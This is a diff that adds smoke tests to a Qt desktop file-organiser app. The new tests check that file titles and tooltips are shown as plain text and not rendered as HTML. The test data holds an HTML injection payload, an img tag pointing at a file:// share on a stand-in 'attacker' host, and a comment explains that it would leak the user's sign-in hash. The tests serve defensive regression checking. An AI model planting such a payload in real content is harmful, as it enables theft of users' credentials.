@@ -1,5 +1,6 @@
 """Smoke tests of the desktop app's screens (drawn off screen, with the fake model)."""
 
+import html
 import subprocess
 import sys
 from collections.abc import Iterator
@@ -25,6 +26,7 @@ from autoshelf.ui.main_window import MainWindow
 from autoshelf.ui.settings_view import SettingsView
 from autoshelf.ui.tasks import TaskRunner
 from autoshelf.ui.tray import Tray
+from autoshelf.ui.widgets import plain_tooltip
 
 WAIT_MS = 10_000
 
@@ -102,6 +104,26 @@ def test_inbox_shows_files_and_suggestions(qtbot, service, runner, shelf: Path) 
     assert "Why it's here" in view.why.text()
     assert view.preview.toPlainText() == "invoice tax"
     assert [view.other.itemText(i) for i in range(view.other.count())] == ["Finance", "Recipes"]
+
+
+def test_inbox_shows_text_from_files_literally(qtbot, service, runner, shelf: Path) -> None:
+    # Shown as HTML, the title would make Qt open \\attacker\share (leaking the sign-in hash).
+    title = '<img src="file://attacker/share/x.png">Agenda'
+    make(shelf / "_Inbox" / "agenda.html", f"<title>{html.escape(title)}</title><p>agenda</p>")
+    view = InboxView(service, runner)
+    qtbot.addWidget(view)
+    view.refresh()
+    settle(qtbot, runner)
+    assert view.title.text() == f"Title: {title}"
+    for label in (view.name, view.title, view.why, view.rename_label):
+        assert label.textFormat() == Qt.TextFormat.PlainText
+
+
+def test_plain_tooltip_never_renders_html() -> None:
+    assert plain_tooltip("invoice total") == "invoice total"
+    shown = plain_tooltip('<img src="file://attacker/share/x.png"> notes')
+    assert "<img" not in shown
+    assert "&lt;img" in shown
 
 
 def test_choosing_a_suggestion_moves_the_file(qtbot, service, runner, shelf: Path) -> None:
